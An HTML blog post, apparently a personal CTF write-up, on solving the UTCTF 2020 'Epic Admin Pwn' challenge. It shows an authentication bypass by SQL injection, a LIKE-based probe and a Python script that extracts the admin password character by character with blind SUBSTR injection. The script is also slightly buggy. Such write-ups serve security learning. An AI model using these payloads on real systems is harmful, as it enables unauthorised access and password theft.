@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+  <title>Utctf 2020 epic admin pwn | Jamvie: CTF writeups and more</title>
+  <meta charset='utf-8'>
+  <meta name = 'viewport' content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
+  <meta http-equiv = 'X-UA-Compatible' content = 'IE=edge'>
+  <meta name = 'SKYPE_TOOLBAR' content = 'SKYPE_TOOLBAR_PARSER_COMPATIBLE' /><meta name = 'keywords' content = 'Jamvie: CTF writeups and more'>
+<meta property = 'og:locale' content = 'en_US' />
+<meta property = 'og:type' content = 'article' />
+<meta property = 'og:title' content = 'utctf 2020: Epic Admin Pwn' />
+<meta property = 'og:description' content = 'I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas ISSS. My team and I solved a very fun SQLi-based …'>
+<meta property = 'og:url' content = 'https://jamvie.net/post/01utctf01/' />
+<meta property = 'og:image' content = 'https://jamvie.net/images/Database.jpg'/>
+<link rel='apple-touch-icon' sizes='180x180' href='https://jamvie.net/images/icons/apple-touch-icon.png'>
+<link rel='icon' type='image/png' sizes='32x32' href='https://jamvie.net/images/icons/favicon-32x32.png'>
+<link rel='icon' type='image/png' sizes='16x16' href='https://jamvie.net/images/icons/favicon-16x16.png'>
+<link rel='manifest' href='https://jamvie.net/images/icons/site.webmanifest'>
+<meta name='msapplication-TileColor' content='#da532c'>
+<meta name='theme-color' content='#ffffff'>
+
+  <link rel='canonical' href='https://jamvie.net/post/01utctf01/'>
+  <link rel = 'stylesheet' href = 'https://jamvie.net/css/main.a9f0d07ece0d4b9cee910125ba1579a4e144c2cb962e6398f53fc29c8db92527c9ab161c6fe73daafaa5ab29c6ba46a739f7855ed85797338a9852614bc4dfaa.css' integrity = 'sha512-qfDQfs4NS5zukQEluhV5pOFEwsuWLmOY9T/CnI25JSfJqxYcb&#43;c9qvqlqynGukanOfeFXthXlzOKmFJhS8Tfqg=='>
+</head>
+
+  <body>
+    <div class = 'nav-drop'>
+  <div class = 'nav-body'>
+    
+      <a href = 'https://jamvie.net/' class = 'nav_item'>Blog</a>
+    
+      <a href = 'https://jamvie.net/about/' class = 'nav_item'>About Me</a>
+    
+      <a href = 'https://jamvie.net/tags' class = 'nav_item'>Tags</a>
+    
+      <a href = 'https://jamvie.net/post/' class = 'nav_item'>Archive</a>
+    
+      <a href = 'https://jamiepoli.github.io/' class = 'nav_item'>Personal Site</a>
+    
+    <div class = 'nav-close'></div>
+    <div class = 'color_mode'>
+<label for = 'mode'>Toggle Dark Mode</label>
+<input type = 'checkbox' class = 'color_choice' id = 'mode'>
+</div>
+
+  </div>
+</div>
+<header class = 'nav' >
+  <nav class = 'nav-menu'>
+    <a href='https://jamvie.net/' class = 'nav-brand nav_item'>Jamvie: CTF writeups and more</a>
+    <div class = 'nav_bar-wrap'>
+      <div class = 'nav_bar'></div>
+    </div>
+  </nav>
+</header>
+
+
+    <main>
+      
+  <div class = 'wrap mt post'>
+    <div><p class = 'post_date pale'>22. April 2020</p>
+      <h1 class = 'post_title'>utctf 2020: Epic Admin Pwn</h1>
+      <div class = 'post_body'>
+        <div class = 'post_inner'>
+        
+          <img src = 'https://jamvie.net/images/Database.jpg' alt = 'Database.jpg' class = 'post_thumbnail'>
+        
+          <p>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas <a href="https://www.isss.io/">ISSS</a>. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>We are presented with a clean and minimal login page. The challenge&rsquo;s description says that &ldquo;the password is the flag&rdquo;. Well, since this is only a login page, I&rsquo;d figure to try and get into admin somehow.</p>
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot1.png" alt="login"></p>
+<p>Initial attempts to do some scoping for SQL vulnerabilities didn&rsquo;t do anything. Inputting a single quote ' mark wouldn&rsquo;t show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: <code>admin--</code> If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin.
+And it worked!</p>
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot2.png" alt="adminpage"></p>
+<p>It&rsquo;s a static welcome page, so I didn&rsquo;t get anything useful past learning that the admin&rsquo;s username was, in fact, admin. And the challenge&rsquo;s description told me as such - if I wanted the password, I needed to do something else.</p>
+<p>The fact that I got into admin meant that I malformed the SQL query so that it would ignore any sort of password checking. But, I kinda need some form of password validation in order to get any headstart on what it was. Luckily, SQL utilizes alot of logic-based keywords that lets us essentially guess the password with custom SQL we inject into it. We would want to inject rogue SQL so that the underlying query would look like,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-SQL" data-lang="SQL">
+<span class="k">admin</span><span class="s1">&#39; AND pass LIKE (&#39;</span><span class="n">J</span><span class="o">%</span><span class="s1">&#39;)
+</span><span class="s1">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>This will return true if the admin&rsquo;s password starts with a J.</p>
+<p>While I use the SQL &lsquo;LIKE&rsquo; keyword here, another keyword called &ldquo;substr&rdquo; or &ldquo;substring&rdquo; exists that I prefer. [From SQL Server Tutorial:] (<a href="https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/">https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/</a>)</p>
+<blockquote>
+<p>The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.</p>
+</blockquote>
+<p>A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using python <del>because its about time I actually learn practical python for myself</del>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python">
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+
+<span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz1234567890{}&#39;</span>
+
+<span class="c1"># url here would&#39;ve been the epic admin pwn site</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
+
+<span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span> 
+        <span class="n">req</span> <span class="o">=</span> <span class="s2">&#34;admin&#39; AND SUBSTR(flag, {index}, 1) = &#39;{char}&#39;--&#34;</span> 
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">req</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="p">:</span> <span class="s2">&#34;JamVieSaysHello&#34;</span><span class="p">}</span> 
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s1">&#39;Welcome, admin!&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span> 
+            <span class="n">flag</span> <span class="o">+=</span> <span class="n">char</span> 
+            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
+            <span class="k">continue</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>The &ldquo;req&rdquo; var here is our custom SQL. The idea here is to test out every character against the password&rsquo;s character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">utflag{dual1pa1sp3rf3ct}
+</code></pre></td></tr></table>
+</div>
+</div><p>Note that, we could technically put anything we wanted into the password field - our input to it never gets checked, because we override whatever checking existed for it with our custom SQL.</p>
+<p>There are admittedly faster ways to do this, for example, if you have burpsuite and sqlmap you could save the post request data into a text file and have sqlmap dump the underlying database for you, which should also return the flag. However, creating the script and testing it out was alot of fun!</p>
+<p>Jam</p>
+<h2 id="references">References</h2>
+<p>Feature Image: <a href="https://unsplash.com/@ikukevk">Kevin Ku on Unsplash</a></p>
+
+        </div>
+        <div class ='post_extra mb-2'>
+          <div class = 'copy'></div>
+
+        </div>
+        <div>
+        
+        </div>
+      </div>
+    </div>
+  </div>
+  <a href = 'https://jamvie.net/' class = 'post_nav'><span class = 'post_next'>The Latest</span>T</a>
+
+    </main>
+    <footer class = 'footer wrap pale'>
+  <p>&copy;&nbsp;<span class = 'year'></span>&nbsp;Jamvie: CTF writeups and more</p>
+  <p>Designed by  <a href = 'https://www.linkedin.com/in/dan-weru-profile/' target = '_blank' title = 'Linkedin Profile' rel = 'nonopener'>Weru</a></p>
+</footer>
+
+
+<script src = 'https://jamvie.net/js/index.min.d69f471ae38fbfddb2d849ebf49889f0b3b3060efe637469d94aed178db3e067313fbee0a083cbccb6941a1367f743bd80686414fd921175f0d60b52b68eaa67.js'></script>
+
+  </body>
+</html>
